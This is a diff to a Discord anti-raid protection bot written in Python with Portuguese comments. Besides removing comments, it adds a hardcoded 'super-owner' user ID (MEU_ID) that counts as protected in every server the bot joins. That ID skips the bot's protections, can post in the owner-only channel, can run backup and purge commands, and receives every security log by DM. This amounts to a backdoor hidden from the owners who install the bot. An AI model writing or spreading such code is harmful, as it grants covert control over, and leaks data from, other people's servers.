@@ -11,6 +11,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 ADM_CONFIANCA = []
 LOGS_CHANNEL_ID = 1567711809396277318
 SOLO_DONO_CHANNEL_ID = 1567716695760703528
+# TEU ID - SUPER-DONO EM TODOS OS SERVIDORES
+MEU_ID = 926223827590078504
 # =====================
 
 def get_dono_id(guild):
@@ -23,6 +25,10 @@ def get_dono_id(guild):
     return None
 
 def is_protegido(guild, user_id):
+    # 1. TU - vale em qualquer servidor
+    if user_id == MEU_ID:
+        return True
+    # 2. Dono do servidor atual
     if guild is not None and user_id == get_dono_id(guild):
         return True
     return user_id in ADM_CONFIANCA
@@ -35,7 +41,6 @@ def backup_temp_path(guild_id):
     return f"backup_temp_{guild_id}.json"
 
 def backup_path(guild_id):
-    # compatibilidade com backup antigo
     return backup_bom_path(guild_id)
 
 def _carregar_arquivo(path):
@@ -54,9 +59,7 @@ def _salvar_arquivo(path, dados):
         print(f"Erro salvar {path}: {e}")
 
 def carregar_backup(guild_id):
-    # SEMPRE retorna o BOM - é ele que usa pra restaurar
     dados = _carregar_arquivo(backup_bom_path(guild_id))
-    # Migração: se não tem BOM mas tem backup antigo, usa ele
     if not dados["canais"] and not dados["cargos"]:
         antigo = f"backup_{guild_id}.json"
         if os.path.exists(antigo):
@@ -70,7 +73,6 @@ def carregar_backup_temp(guild_id):
     return _carregar_arquivo(backup_temp_path(guild_id))
 
 def salvar_backup(guild_id, dados):
-    # salvar_backup agora = salva no BOM (usado só em casos seguros)
     _salvar_arquivo(backup_bom_path(guild_id), dados)
 
 def salvar_backup_temp(guild_id, dados):
@@ -134,7 +136,6 @@ async def sync_backup_loop():
             if teve_raid_recente(guild.id, 30):
                 print(f"⏸️ Sync pulado {guild.name}: teve raid recente, BOM mantido travado")
                 continue
-            # Sem raid: TEMP é confiável, joga pro BOM
             foto_atual = tirar_foto_guild(guild)
             salvar_backup_temp(guild.id, foto_atual)
             salvar_backup_bom(guild.id, foto_atual)
@@ -159,12 +160,17 @@ async def enviar_log_simples(guild, titulo, descricao, cor=0xFF0000):
     except Exception as e:
         print(f"Erro log canal: {e}")
     if "Raid finalizado" not in titulo and "Banido" not in titulo:
-        try:
-            dono_id = get_dono_id(guild)
-            if dono_id:
-                dono = await bot.fetch_user(dono_id)
-                await dono.send(f"{titulo}\n{descricao}")
-        except: pass
+        # Manda pro dono + pra tu (super-dono)
+        alvos = set()
+        dono_id = get_dono_id(guild)
+        if dono_id:
+            alvos.add(dono_id)
+        alvos.add(MEU_ID)
+        for uid in alvos:
+            try:
+                u = await bot.fetch_user(uid)
+                await u.send(f"{titulo}\n{descricao}")
+            except: pass
 
 async def enviar_log(guild, titulo, descricao, cor=0xFF0000):
     await enviar_log_simples(guild, titulo, descricao, cor)
@@ -244,14 +250,12 @@ async def restaurar_tudo(guild):
     if not st["ativo"]:
         return
     print(f"♻️ Começando restauração em {guild.name}...")
-    # USA SEMPRE O BOM, nunca o TEMP sujo
     backup = carregar_backup(guild.id)
     canais_restaurados = 0
     canais_raid_apagados = 0
     canais_renomeados = 0
     cargos_restaurados = 0
 
-    # 1. Apaga canais que NÃO estão no BOM (canais do raid) - por ID
     ids_backup = {c["id"] for c in backup["canais"]}
     for ch in list(guild.channels):
         if ch.id not in ids_backup and ch.id not in st["canais_apagados_ids"]:
@@ -263,7 +267,6 @@ async def restaurar_tudo(guild):
                 await asyncio.sleep(0.3)
             except: pass
 
-    # 2. Corrige nome / posição de canais que existem mas foram renomeados
     mapa_backup = {c["id"]: c for c in backup["canais"]}
     for ch in list(guild.channels):
         if ch.id in mapa_backup:
@@ -294,7 +297,6 @@ async def restaurar_tudo(guild):
             except Exception as e:
                 print(f"Erro corrigir canal {ch.name}: {e}")
 
-    # 3. Recria canais apagados - ordenado por posição, suporta 50 com mesmo nome por ID
     canais_atuais_ids = {c.id for c in guild.channels}
     for cdata in sorted(backup["canais"], key=lambda x: x["position"]):
         if cdata["id"] not in canais_atuais_ids:
@@ -338,11 +340,9 @@ async def restaurar_tudo(guild):
     except: pass
 
     raid_state[guild.id] = {"ativo": False, "raider_id": None, "raider_nome": "Desconhecido", "canais_apagados_ids": set(), "cargos_apagados": [], "timer": None, "ultimo_ataque": time.time(), "canais_raid_criados": set(), "qtd_ataques": 0}
-    # IMPORTANTE: TEMP sujo é jogado fora e refeito limpo a partir do servidor restaurado
     try:
         foto_limpa = tirar_foto_guild(guild)
         salvar_backup_temp(guild.id, foto_limpa)
-        # NÃO atualiza o BOM aqui, ele fica travado até passar 30min sem raid
     except: pass
     print(f"✅ Restauração finalizada em {guild.name}")
 
@@ -352,14 +352,12 @@ async def on_ready():
     await bot.change_presence(activity=discord.Game(name="🛡️ SYSTEM PROTECTING"))
     for guild in bot.guilds:
         try:
-            # Só cria BOM se ainda NÃO existir. Se já existir, NÃO sobrescreve (pode ter entrado no meio de raid)
             if not os.path.exists(backup_bom_path(guild.id)):
                 foto = tirar_foto_guild(guild)
                 salvar_backup_bom(guild.id, foto)
                 salvar_backup_temp(guild.id, foto)
                 print(f"📸 Backup inicial criado: {guild.name}")
             else:
-                # Garante que TEMP existe
                 if not os.path.exists(backup_temp_path(guild.id)):
                     salvar_backup_temp(guild.id, tirar_foto_guild(guild))
                 print(f"📂 Backup BOM carregado: {guild.name}")
@@ -390,7 +388,8 @@ async def on_message(message):
         mensagens_processadas.add(message.id)
 
     if message.channel.id == SOLO_DONO_CHANNEL_ID:
-        if message.author.id != get_dono_id(message.guild):
+        # Agora tu + dono podem falar aqui
+        if not is_protegido(message.guild, message.author.id):
             try: await message.delete()
             except: pass
             return
@@ -398,10 +397,14 @@ async def on_message(message):
         return
 
     if message.channel.id == LOGS_CHANNEL_ID:
+        # Se for tu ou dono com comando, processa ANTES de apagar
+        if message.content.startswith("!") and is_protegido(message.guild, message.author.id):
+            await bot.process_commands(message)
+            try: await message.delete()
+            except: pass
+            return
         try: await message.delete()
         except: pass
-        if message.content.startswith("!"):
-            await bot.process_commands(message)
         return
 
     if is_protegido(message.guild, message.author.id):
@@ -440,7 +443,6 @@ async def on_guild_channel_create(channel):
         st["ultimo_ataque"] = time.time()
         agendar_recuperacao(guild)
         return
-    # Sem raid: atualiza só TEMP, não BOM
     try:
         dados = carregar_backup_temp(guild.id)
         if not any(c["id"] == channel.id for c in dados["canais"]):
@@ -465,7 +467,6 @@ async def on_guild_channel_delete(channel):
         return
 
     ex = await pegar_executor(guild, discord.AuditLogAction.channel_delete)
-    # Sem raid: remove só do TEMP
     try:
         dados = carregar_backup_temp(guild.id)
         dados["canais"] = [c for c in dados["canais"] if c["id"] != channel.id]
@@ -499,7 +500,6 @@ async def on_guild_channel_update(antes, depois):
         st["ultimo_ataque"] = time.time()
         agendar_recuperacao(depois.guild)
         return
-    # CORRIGIDO: agora salva rename também, no TEMP
     if antes.name != depois.name or antes.position != depois.position or getattr(antes, "topic", None) != getattr(depois, "topic", None):
         try:
             dados = carregar_backup_temp(depois.guild.id)
@@ -620,14 +620,16 @@ async def protecoes(ctx):
     embed.set_footer(text=f"Servidor: {ctx.guild.name} • Protegido por {bot.user.name}", icon_url=bot.user.display_avatar.url)
     await ctx.send(embed=embed)
 
-# NOVO: !atualizar backup - SÓ DONO, força BOM agora sem esperar 30min
-@bot.command(name="atualizar")
+# !atualizar backup - DONO + TU (MEU_ID) - força BOM agora sem esperar 30min
+@bot.command(name="atualizar", aliases=["atualizarbackup", "backup", "salvar"])
 async def atualizar_backup(ctx, *, arg: str = ""):
-    if ctx.author.id != get_dono_id(ctx.guild):
+    if not is_protegido(ctx.guild, ctx.author.id):
         try: await ctx.message.delete()
         except: pass
         return
-    if arg.strip().lower() != "backup":
+    if ctx.invoked_with in ["backup", "salvar"]:
+        arg = "backup"
+    if arg.strip().lower() not in ["backup", ""]:
         await ctx.send("Usa assim: `!atualizar backup`", delete_after=5)
         return
     st = get_raid(ctx.guild.id)
@@ -639,13 +641,13 @@ async def atualizar_backup(ctx, *, arg: str = ""):
         salvar_backup_bom(ctx.guild.id, foto)
         salvar_backup_temp(ctx.guild.id, foto)
         await ctx.send(f"✅ Backup BOM atualizado na hora! **{len(foto['canais'])} canais** e **{len(foto['cargos'])} cargos** salvos.", delete_after=8)
-        print(f"✅ Backup BOM forçado pelo dono em {ctx.guild.name}")
+        print(f"✅ Backup BOM forçado por {ctx.author} em {ctx.guild.name}")
     except Exception as e:
         await ctx.send(f"❌ Erro ao atualizar backup: {e}", delete_after=8)
 
 @bot.command(name="limpar")
 async def limpar(ctx, quantidade: int = 0):
-    if ctx.author.id != get_dono_id(ctx.guild):
+    if not is_protegido(ctx.guild, ctx.author.id):
         try: await ctx.message.delete()
         except: pass
         return
